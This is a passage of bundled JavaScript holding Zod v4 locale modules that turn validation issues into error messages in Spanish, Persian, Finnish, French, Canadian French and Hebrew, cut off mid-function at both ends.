        return `Llave${issue2.keys.length > 1 ? "s" : ""} desconocida${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Llave inv\xE1lida en ${TypeDictionary[issue2.origin] ?? issue2.origin}`;
      case "invalid_union":
        return "Entrada inv\xE1lida";
      case "invalid_element":
        return `Valor inv\xE1lido en ${TypeDictionary[issue2.origin] ?? issue2.origin}`;
      default:
        return `Entrada inv\xE1lida`;
    }
  };
};
function es_default() {
  return {
    localeError: error11()
  };
}
// node_modules/zod/v4/locales/fa.js
var error12 = () => {
  const Sizable = {
    string: { unit: "\u06A9\u0627\u0631\u0627\u06A9\u062A\u0631", verb: "\u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F" },
    file: { unit: "\u0628\u0627\u06CC\u062A", verb: "\u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F" },
    array: { unit: "\u0622\u06CC\u062A\u0645", verb: "\u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F" },
    set: { unit: "\u0622\u06CC\u062A\u0645", verb: "\u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0648\u0631\u0648\u062F\u06CC",
    email: "\u0622\u062F\u0631\u0633 \u0627\u06CC\u0645\u06CC\u0644",
    url: "URL",
    emoji: "\u0627\u06CC\u0645\u0648\u062C\u06CC",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u062A\u0627\u0631\u06CC\u062E \u0648 \u0632\u0645\u0627\u0646 \u0627\u06CC\u0632\u0648",
    date: "\u062A\u0627\u0631\u06CC\u062E \u0627\u06CC\u0632\u0648",
    time: "\u0632\u0645\u0627\u0646 \u0627\u06CC\u0632\u0648",
    duration: "\u0645\u062F\u062A \u0632\u0645\u0627\u0646 \u0627\u06CC\u0632\u0648",
    ipv4: "IPv4 \u0622\u062F\u0631\u0633",
    ipv6: "IPv6 \u0622\u062F\u0631\u0633",
    cidrv4: "IPv4 \u062F\u0627\u0645\u0646\u0647",
    cidrv6: "IPv6 \u062F\u0627\u0645\u0646\u0647",
    base64: "base64-encoded \u0631\u0634\u062A\u0647",
    base64url: "base64url-encoded \u0631\u0634\u062A\u0647",
    json_string: "JSON \u0631\u0634\u062A\u0647",
    e164: "E.164 \u0639\u062F\u062F",
    jwt: "JWT",
    template_literal: "\u0648\u0631\u0648\u062F\u06CC"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0639\u062F\u062F",
    array: "\u0622\u0631\u0627\u06CC\u0647"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0645\u06CC\u200C\u0628\u0627\u06CC\u0633\u062A instanceof ${issue2.expected} \u0645\u06CC\u200C\u0628\u0648\u062F\u060C ${received} \u062F\u0631\u06CC\u0627\u0641\u062A \u0634\u062F`;
        }
        return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0645\u06CC\u200C\u0628\u0627\u06CC\u0633\u062A ${expected} \u0645\u06CC\u200C\u0628\u0648\u062F\u060C ${received} \u062F\u0631\u06CC\u0627\u0641\u062A \u0634\u062F`;
      }
      case "invalid_value":
        if (issue2.values.length === 1) {
          return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0645\u06CC\u200C\u0628\u0627\u06CC\u0633\u062A ${stringifyPrimitive(issue2.values[0])} \u0645\u06CC\u200C\u0628\u0648\u062F`;
        }
        return `\u06AF\u0632\u06CC\u0646\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0645\u06CC\u200C\u0628\u0627\u06CC\u0633\u062A \u06CC\u06A9\u06CC \u0627\u0632 ${joinValues(issue2.values, "|")} \u0645\u06CC\u200C\u0628\u0648\u062F`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u062E\u06CC\u0644\u06CC \u0628\u0632\u0631\u06AF: ${issue2.origin ?? "\u0645\u0642\u062F\u0627\u0631"} \u0628\u0627\u06CC\u062F ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u0639\u0646\u0635\u0631"} \u0628\u0627\u0634\u062F`;
        }
        return `\u062E\u06CC\u0644\u06CC \u0628\u0632\u0631\u06AF: ${issue2.origin ?? "\u0645\u0642\u062F\u0627\u0631"} \u0628\u0627\u06CC\u062F ${adj}${issue2.maximum.toString()} \u0628\u0627\u0634\u062F`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u062E\u06CC\u0644\u06CC \u06A9\u0648\u0686\u06A9: ${issue2.origin} \u0628\u0627\u06CC\u062F ${adj}${issue2.minimum.toString()} ${sizing.unit} \u0628\u0627\u0634\u062F`;
        }
        return `\u062E\u06CC\u0644\u06CC \u06A9\u0648\u0686\u06A9: ${issue2.origin} \u0628\u0627\u06CC\u062F ${adj}${issue2.minimum.toString()} \u0628\u0627\u0634\u062F`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u0631\u0634\u062A\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0628\u0627 "${_issue.prefix}" \u0634\u0631\u0648\u0639 \u0634\u0648\u062F`;
        }
        if (_issue.format === "ends_with") {
          return `\u0631\u0634\u062A\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0628\u0627 "${_issue.suffix}" \u062A\u0645\u0627\u0645 \u0634\u0648\u062F`;
        }
        if (_issue.format === "includes") {
          return `\u0631\u0634\u062A\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0634\u0627\u0645\u0644 "${_issue.includes}" \u0628\u0627\u0634\u062F`;
        }
        if (_issue.format === "regex") {
          return `\u0631\u0634\u062A\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0628\u0627 \u0627\u0644\u06AF\u0648\u06CC ${_issue.pattern} \u0645\u0637\u0627\u0628\u0642\u062A \u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F`;
        }
        return `${FormatDictionary[_issue.format] ?? issue2.format} \u0646\u0627\u0645\u0639\u062A\u0628\u0631`;
      }
      case "not_multiple_of":
        return `\u0639\u062F\u062F \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0645\u0636\u0631\u0628 ${issue2.divisor} \u0628\u0627\u0634\u062F`;
      case "unrecognized_keys":
        return `\u06A9\u0644\u06CC\u062F${issue2.keys.length > 1 ? "\u0647\u0627\u06CC" : ""} \u0646\u0627\u0634\u0646\u0627\u0633: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u06A9\u0644\u06CC\u062F \u0646\u0627\u0634\u0646\u0627\u0633 \u062F\u0631 ${issue2.origin}`;
      case "invalid_union":
        return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631`;
      case "invalid_element":
        return `\u0645\u0642\u062F\u0627\u0631 \u0646\u0627\u0645\u0639\u062A\u0628\u0631 \u062F\u0631 ${issue2.origin}`;
      default:
        return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631`;
    }
  };
};
function fa_default() {
  return {
    localeError: error12()
  };
}
// node_modules/zod/v4/locales/fi.js
var error13 = () => {
  const Sizable = {
    string: { unit: "merkki\xE4", subject: "merkkijonon" },
    file: { unit: "tavua", subject: "tiedoston" },
    array: { unit: "alkiota", subject: "listan" },
    set: { unit: "alkiota", subject: "joukon" },
    number: { unit: "", subject: "luvun" },
    bigint: { unit: "", subject: "suuren kokonaisluvun" },
    int: { unit: "", subject: "kokonaisluvun" },
    date: { unit: "", subject: "p\xE4iv\xE4m\xE4\xE4r\xE4n" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "s\xE4\xE4nn\xF6llinen lauseke",
    email: "s\xE4hk\xF6postiosoite",
    url: "URL-osoite",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO-aikaleima",
    date: "ISO-p\xE4iv\xE4m\xE4\xE4r\xE4",
    time: "ISO-aika",
    duration: "ISO-kesto",
    ipv4: "IPv4-osoite",
    ipv6: "IPv6-osoite",
    cidrv4: "IPv4-alue",
    cidrv6: "IPv6-alue",
    base64: "base64-koodattu merkkijono",
    base64url: "base64url-koodattu merkkijono",
    json_string: "JSON-merkkijono",
    e164: "E.164-luku",
    jwt: "JWT",
    template_literal: "templaattimerkkijono"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Virheellinen tyyppi: odotettiin instanceof ${issue2.expected}, oli ${received}`;
        }
        return `Virheellinen tyyppi: odotettiin ${expected}, oli ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Virheellinen sy\xF6te: t\xE4ytyy olla ${stringifyPrimitive(issue2.values[0])}`;
        return `Virheellinen valinta: t\xE4ytyy olla yksi seuraavista: ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Liian suuri: ${sizing.subject} t\xE4ytyy olla ${adj}${issue2.maximum.toString()} ${sizing.unit}`.trim();
        }
        return `Liian suuri: arvon t\xE4ytyy olla ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Liian pieni: ${sizing.subject} t\xE4ytyy olla ${adj}${issue2.minimum.toString()} ${sizing.unit}`.trim();
        }
        return `Liian pieni: arvon t\xE4ytyy olla ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Virheellinen sy\xF6te: t\xE4ytyy alkaa "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Virheellinen sy\xF6te: t\xE4ytyy loppua "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Virheellinen sy\xF6te: t\xE4ytyy sis\xE4lt\xE4\xE4 "${_issue.includes}"`;
        if (_issue.format === "regex") {
          return `Virheellinen sy\xF6te: t\xE4ytyy vastata s\xE4\xE4nn\xF6llist\xE4 lauseketta ${_issue.pattern}`;
        }
        return `Virheellinen ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Virheellinen luku: t\xE4ytyy olla luvun ${issue2.divisor} monikerta`;
      case "unrecognized_keys":
        return `${issue2.keys.length > 1 ? "Tuntemattomat avaimet" : "Tuntematon avain"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return "Virheellinen avain tietueessa";
      case "invalid_union":
        return "Virheellinen unioni";
      case "invalid_element":
        return "Virheellinen arvo joukossa";
      default:
        return `Virheellinen sy\xF6te`;
    }
  };
};
function fi_default() {
  return {
    localeError: error13()
  };
}
// node_modules/zod/v4/locales/fr.js
var error14 = () => {
  const Sizable = {
    string: { unit: "caract\xE8res", verb: "avoir" },
    file: { unit: "octets", verb: "avoir" },
    array: { unit: "\xE9l\xE9ments", verb: "avoir" },
    set: { unit: "\xE9l\xE9ments", verb: "avoir" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "entr\xE9e",
    email: "adresse e-mail",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "date et heure ISO",
    date: "date ISO",
    time: "heure ISO",
    duration: "dur\xE9e ISO",
    ipv4: "adresse IPv4",
    ipv6: "adresse IPv6",
    cidrv4: "plage IPv4",
    cidrv6: "plage IPv6",
    base64: "cha\xEEne encod\xE9e en base64",
    base64url: "cha\xEEne encod\xE9e en base64url",
    json_string: "cha\xEEne JSON",
    e164: "num\xE9ro E.164",
    jwt: "JWT",
    template_literal: "entr\xE9e"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "nombre",
    array: "tableau"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Entr\xE9e invalide : instanceof ${issue2.expected} attendu, ${received} re\xE7u`;
        }
        return `Entr\xE9e invalide : ${expected} attendu, ${received} re\xE7u`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Entr\xE9e invalide : ${stringifyPrimitive(issue2.values[0])} attendu`;
        return `Option invalide : une valeur parmi ${joinValues(issue2.values, "|")} attendue`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Trop grand : ${issue2.origin ?? "valeur"} doit ${sizing.verb} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\xE9l\xE9ment(s)"}`;
        return `Trop grand : ${issue2.origin ?? "valeur"} doit \xEAtre ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Trop petit : ${issue2.origin} doit ${sizing.verb} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Trop petit : ${issue2.origin} doit \xEAtre ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Cha\xEEne invalide : doit commencer par "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Cha\xEEne invalide : doit se terminer par "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Cha\xEEne invalide : doit inclure "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Cha\xEEne invalide : doit correspondre au mod\xE8le ${_issue.pattern}`;
        return `${FormatDictionary[_issue.format] ?? issue2.format} invalide`;
      }
      case "not_multiple_of":
        return `Nombre invalide : doit \xEAtre un multiple de ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Cl\xE9${issue2.keys.length > 1 ? "s" : ""} non reconnue${issue2.keys.length > 1 ? "s" : ""} : ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Cl\xE9 invalide dans ${issue2.origin}`;
      case "invalid_union":
        return "Entr\xE9e invalide";
      case "invalid_element":
        return `Valeur invalide dans ${issue2.origin}`;
      default:
        return `Entr\xE9e invalide`;
    }
  };
};
function fr_default() {
  return {
    localeError: error14()
  };
}
// node_modules/zod/v4/locales/fr-CA.js
var error15 = () => {
  const Sizable = {
    string: { unit: "caract\xE8res", verb: "avoir" },
    file: { unit: "octets", verb: "avoir" },
    array: { unit: "\xE9l\xE9ments", verb: "avoir" },
    set: { unit: "\xE9l\xE9ments", verb: "avoir" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "entr\xE9e",
    email: "adresse courriel",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "date-heure ISO",
    date: "date ISO",
    time: "heure ISO",
    duration: "dur\xE9e ISO",
    ipv4: "adresse IPv4",
    ipv6: "adresse IPv6",
    cidrv4: "plage IPv4",
    cidrv6: "plage IPv6",
    base64: "cha\xEEne encod\xE9e en base64",
    base64url: "cha\xEEne encod\xE9e en base64url",
    json_string: "cha\xEEne JSON",
    e164: "num\xE9ro E.164",
    jwt: "JWT",
    template_literal: "entr\xE9e"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Entr\xE9e invalide : attendu instanceof ${issue2.expected}, re\xE7u ${received}`;
        }
        return `Entr\xE9e invalide : attendu ${expected}, re\xE7u ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Entr\xE9e invalide : attendu ${stringifyPrimitive(issue2.values[0])}`;
        return `Option invalide : attendu l'une des valeurs suivantes ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "\u2264" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Trop grand : attendu que ${issue2.origin ?? "la valeur"} ait ${adj}${issue2.maximum.toString()} ${sizing.unit}`;
        return `Trop grand : attendu que ${issue2.origin ?? "la valeur"} soit ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? "\u2265" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Trop petit : attendu que ${issue2.origin} ait ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Trop petit : attendu que ${issue2.origin} soit ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `Cha\xEEne invalide : doit commencer par "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Cha\xEEne invalide : doit se terminer par "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Cha\xEEne invalide : doit inclure "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Cha\xEEne invalide : doit correspondre au motif ${_issue.pattern}`;
        return `${FormatDictionary[_issue.format] ?? issue2.format} invalide`;
      }
      case "not_multiple_of":
        return `Nombre invalide : doit \xEAtre un multiple de ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Cl\xE9${issue2.keys.length > 1 ? "s" : ""} non reconnue${issue2.keys.length > 1 ? "s" : ""} : ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Cl\xE9 invalide dans ${issue2.origin}`;
      case "invalid_union":
        return "Entr\xE9e invalide";
      case "invalid_element":
        return `Valeur invalide dans ${issue2.origin}`;
      default:
        return `Entr\xE9e invalide`;
    }
  };
};
function fr_CA_default() {
  return {
    localeError: error15()
  };
}
// node_modules/zod/v4/locales/he.js
var error16 = () => {
  const TypeNames = {
    string: { label: "\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA", gender: "f" },
    number: { label: "\u05DE\u05E1\u05E4\u05E8", gender: "m" },
    boolean: { label: "\u05E2\u05E8\u05DA \u05D1\u05D5\u05DC\u05D9\u05D0\u05E0\u05D9", gender: "m" },
    bigint: { label: "BigInt", gender: "m" },
    date: { label: "\u05EA\u05D0\u05E8\u05D9\u05DA", gender: "m" },
    array: { label: "\u05DE\u05E2\u05E8\u05DA", gender: "m" },
    object: { label: "\u05D0\u05D5\u05D1\u05D9\u05D9\u05E7\u05D8", gender: "m" },
    null: { label: "\u05E2\u05E8\u05DA \u05E8\u05D9\u05E7 (null)", gender: "m" },
    undefined: { label: "\u05E2\u05E8\u05DA \u05DC\u05D0 \u05DE\u05D5\u05D2\u05D3\u05E8 (undefined)", gender: "m" },
    symbol: { label: "\u05E1\u05D9\u05DE\u05D1\u05D5\u05DC (Symbol)", gender: "m" },
    function: { label: "\u05E4\u05D5\u05E0\u05E7\u05E6\u05D9\u05D4", gender: "f" },
    map: { label: "\u05DE\u05E4\u05D4 (Map)", gender: "f" },
    set: { label: "\u05E7\u05D1\u05D5\u05E6\u05D4 (Set)", gender: "f" },
    file: { label: "\u05E7\u05D5\u05D1\u05E5", gender: "m" },
    promise: { label: "Promise", gender: "m" },
    NaN: { label: "NaN", gender: "m" },
    unknown: { label: "\u05E2\u05E8\u05DA \u05DC\u05D0 \u05D9\u05D3\u05D5\u05E2", gender: "m" },
    value: { label: "\u05E2\u05E8\u05DA", gender: "m" }
  };
  const Sizable = {
    string: { unit: "\u05EA\u05D5\u05D5\u05D9\u05DD", shortLabel: "\u05E7\u05E6\u05E8", longLabel: "\u05D0\u05E8\u05D5\u05DA" },
    file: { unit: "\u05D1\u05D9\u05D9\u05D8\u05D9\u05DD", shortLabel: "\u05E7\u05D8\u05DF", longLabel: "\u05D2\u05D3\u05D5\u05DC" },
    array: { unit: "\u05E4\u05E8\u05D9\u05D8\u05D9\u05DD", shortLabel: "\u05E7\u05D8\u05DF", longLabel: "\u05D2\u05D3\u05D5\u05DC" },
    set: { unit: "\u05E4\u05E8\u05D9\u05D8\u05D9\u05DD", shortLabel: "\u05E7\u05D8\u05DF", longLabel: "\u05D2\u05D3\u05D5\u05DC" },
    number: { unit: "", shortLabel: "\u05E7\u05D8\u05DF", longLabel: "\u05D2\u05D3\u05D5\u05DC" }
  };
  const typeEntry = (t) => t ? TypeNames[t] : undefined;
  const typeLabel = (t) => {
    const e = typeEntry(t);
    if (e)
      return e.label;
    return t ?? TypeNames.unknown.label;
  };
  const withDefinite = (t) => `\u05D4${typeLabel(t)}`;
  const verbFor = (t) => {
    const e = typeEntry(t);
    const gender = e?.gender ?? "m";
    return gender === "f" ? "\u05E6\u05E8\u05D9\u05DB\u05D4 \u05DC\u05D4\u05D9\u05D5\u05EA" : "\u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA";
  };
  const getSizing = (origin) => {
    if (!origin)
      return null;
    return Sizable[origin] ?? null;
  };
  const FormatDictionary = {
    regex: { label: "\u05E7\u05DC\u05D8", gender: "m" },
    email: { label: "\u05DB\u05EA\u05D5\u05D1\u05EA \u05D0\u05D9\u05DE\u05D9\u05D9\u05DC", gender: "f" },
    url: { label: "\u05DB\u05EA\u05D5\u05D1\u05EA \u05E8\u05E9\u05EA", gender: "f" },
    emoji: { label: "\u05D0\u05D9\u05DE\u05D5\u05D2'\u05D9", gender: "m" },
    uuid: { label: "UUID", gender: "m" },
    nanoid: { label: "nanoid", gender: "m" },
    guid: { label: "GUID", gender: "m" },
    cuid: { label: "cuid", gender: "m" },
    cuid2: { label: "cuid2", gender: "m" },
    ulid: { label: "ULID", gender: "m" },
    xid: { label: "XID", gender: "m" },
    ksuid: { label: "KSUID", gender: "m" },
    datetime: { label: "\u05EA\u05D0\u05E8\u05D9\u05DA \u05D5\u05D6\u05DE\u05DF ISO", gender: "m" },
    date: { label: "\u05EA\u05D0\u05E8\u05D9\u05DA ISO", gender: "m" },
    time: { label: "\u05D6\u05DE\u05DF ISO", gender: "m" },
    duration: { label: "\u05DE\u05E9\u05DA \u05D6\u05DE\u05DF ISO", gender: "m" },
    ipv4: { label: "\u05DB\u05EA\u05D5\u05D1\u05EA IPv4", gender: "f" },
    ipv6: { label: "\u05DB\u05EA\u05D5\u05D1\u05EA IPv6", gender: "f" },
    cidrv4: { label: "\u05D8\u05D5\u05D5\u05D7 IPv4", gender: "m" },
    cidrv6: { label: "\u05D8\u05D5\u05D5\u05D7 IPv6", gender: "m" },
    base64: { label: "\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05D1\u05D1\u05E1\u05D9\u05E1 64", gender: "f" },
    base64url: { label: "\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05D1\u05D1\u05E1\u05D9\u05E1 64 \u05DC\u05DB\u05EA\u05D5\u05D1\u05D5\u05EA \u05E8\u05E9\u05EA", gender: "f" },
    json_string: { label: "\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA JSON", gender: "f" },
    e164: { label: "\u05DE\u05E1\u05E4\u05E8 E.164", gender: "m" },
    jwt: { label: "JWT", gender: "m" },
    ends_with: { label: "\u05E7\u05DC\u05D8", gender: "m" },
    includes: { label: "\u05E7\u05DC\u05D8", gender: "m" },
    lowercase: { label: "\u05E7\u05DC\u05D8", gender: "m" },
    starts_with: { label: "\u05E7\u05DC\u05D8", gender: "m" },
    uppercase: { label: "\u05E7\u05DC\u05D8", gender: "m" }
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expectedKey = issue2.expected;
        const expected = TypeDictionary[expectedKey ?? ""] ?? typeLabel(expectedKey);
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? TypeNames[receivedType]?.label ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA instanceof ${issue2.expected}, \u05D4\u05EA\u05E7\u05D1\u05DC ${received}`;
        }
        return `\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA ${expected}, \u05D4\u05EA\u05E7\u05D1\u05DC ${received}`;
      }
      case "invalid_value": {
        if (issue2.values.length === 1) {
          return `\u05E2\u05E8\u05DA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05D4\u05E2\u05E8\u05DA \u05D7\u05D9\u05D9\u05D1 \u05DC\u05D4\u05D9\u05D5\u05EA ${stringifyPrimitive(issue2.values[0])}`;
        }
        const stringified = issue2.values.map((v) => stringifyPrimitive(v));
        if (issue2.values.length === 2) {
          return `\u05E2\u05E8\u05DA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05D4\u05D0\u05E4\u05E9\u05E8\u05D5\u05D9\u05D5\u05EA \u05D4\u05DE\u05EA\u05D0\u05D9\u05DE\u05D5\u05EA \u05D4\u05DF ${stringified[0]} \u05D0\u05D5 ${stringified[1]}`;
        }
        const lastValue = stringified[stringified.length - 1];
        const restValues = stringified.slice(0, -1).join(", ");
        return `\u05E2\u05E8\u05DA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05D4\u05D0\u05E4\u05E9\u05E8\u05D5\u05D9\u05D5\u05EA \u05D4\u05DE\u05EA\u05D0\u05D9\u05DE\u05D5\u05EA \u05D4\u05DF ${restValues} \u05D0\u05D5 ${lastValue}`;
      }
      case "too_big": {
        const sizing = getSizing(issue2.origin);
        const subject = withDefinite(issue2.origin ?? "value");
        if (issue2.origin === "string") {
          return `${sizing?.longLabel ?? "\u05D0\u05E8\u05D5\u05DA"} \u05DE\u05D3\u05D9: ${subject} \u05E6\u05E8\u05D9\u05DB\u05D4 \u05DC\u05D4\u05DB\u05D9\u05DC ${issue2.maximum.toString()} ${sizing?.unit ?? ""} ${issue2.inclusive ? "\u05D0\u05D5 \u05E4\u05D7\u05D5\u05EA" : "\u05DC\u05DB\u05DC \u05D4\u05D9\u05D5\u05EA\u05E8"}`.trim();
        }
        if (issue2.origin === "number") {
          const comparison = issue2.inclusive ? `\u05E7\u05D8\u05DF \u05D0\u05D5 \u05E9\u05D5\u05D5\u05D4 \u05DC-${issue2.maximum}` : `\u05E7\u05D8\u05DF \u05DE-${issue2.maximum}`;
          return `\u05D2\u05D3\u05D5\u05DC \u05DE\u05D3\u05D9: ${subject} \u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA ${comparison}`;
        }
        if (issue2.origin === "array" || issue2.origin === "set") {
          const verb = issue2.origin === "set" ? "\u05E6\u05E8\u05D9\u05DB\u05D4" : "\u05E6\u05E8\u05D9\u05DA";
          const comparison = issue2.inclusive ? `${issue2.maximum} ${sizing?.unit ?? ""} \u05D0\u05D5 \u05E4\u05D7\u05D5\u05EA` : `\u05E4\u05D7\u05D5\u05EA \u05DE-${issue2.maximum} ${sizing?.unit ?? ""}`;
          return `\u05D2\u05D3\u05D5\u05DC \u05DE\u05D3\u05D9: ${subject} ${verb} \u05DC\u05D4\u05DB\u05D9\u05DC ${comparison}`.trim();
        }
        const adj = issue2.inclusive ? "<=" : "<";
        const be = verbFor(issue2.origin ?? "value");
        if (sizing?.unit) {
          return `${sizing.longLabel} \u05DE\u05D3\u05D9: ${subject} ${be} ${adj}${issue2.maximum.toString()} ${sizing.unit}`;
        }
        return `${sizing?.longLabel ?? "\u05D2\u05D3\u05D5\u05DC"} \u05DE\u05D3\u05D9: ${subject} ${be} ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const sizing = getSizing(issue2.origin);
        const subject = withDefinite(issue2.origin ?? "value");
